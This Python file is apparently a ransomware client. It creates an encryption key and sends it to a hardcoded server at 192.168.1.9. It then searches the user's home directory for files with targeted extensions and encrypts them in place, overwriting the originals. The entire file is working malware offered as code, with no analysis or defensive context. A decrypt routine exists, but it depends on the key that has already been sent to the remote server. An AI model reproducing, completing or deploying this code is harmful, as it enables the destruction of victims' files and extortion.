import os
import time
import shutil
from pathlib import Path
from typing import Dict, List
from socket import socket
from modules.settings import YML_DIRS
from modules.core import Terminal, safe_load
from modules.cryptography import Fernet


class Client:
    def __init__(self, host: str, port: int) -> None:
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        self.host = host
        self.port = port
        self.private = Fernet(self.key)

    def connect_server(self) -> None:
        retries = 0
        max_retries = 3
        retry_interval = 10

        while retries < max_retries:
            with socket() as server:
                try:
                    server.connect((self.host, self.port))
                    server.sendall(self.key)
                    return  # Exit the function if connected
                except ConnectionError:
                    retries += 1
                    if retries < max_retries:
                        time.sleep(retry_interval)
                    else:
                        Terminal.Reset()

    def list_files(self) -> Dict[str, List[str]]:
        with open(YML_DIRS, 'r') as file:
            exts = safe_load(file)

        self.file_categories: Dict[str, List[str]] = {category: [] for category in exts}
        extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

        for entry in Path.home().rglob('*'):
            if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
                self.file_categories[extcategory[ext]].append(str(entry))
        
        return self.file_categories

    def process_files(self, mode: str) -> None:
        for category, files in self.file_categories.items():
            for file in files:
                temp_file = file + '.temp'
                try:
                    with open(file, 'rb') as original_file, open(temp_file, 'wb') as temp_file_handle:
                        while True:
                            chunk = original_file.read(1024 * 1024 * 10)  # Read file in chunks
                            if not chunk:
                                break
                            processed_chunk = self.fernet.encrypt(chunk) if mode == 'encrypt' else self.fernet.decrypt(chunk)
                            temp_file_handle.write(processed_chunk)
                    shutil.move(temp_file, file)
                except Exception as e:
                    print(f"Error processing file {file}: {e}")
                    if os.path.exists(temp_file):
                        os.remove(temp_file)

    def encrypt_files(self) -> None:
        self.process_files('encrypt')

    def decrypt_files(self) -> None:
        self.process_files('decrypt')


if __name__ == '__main__':
    bot = Client('192.168.1.9', 12345)
    bot.connect_server()
    bot.list_files()
    bot.encrypt_files()
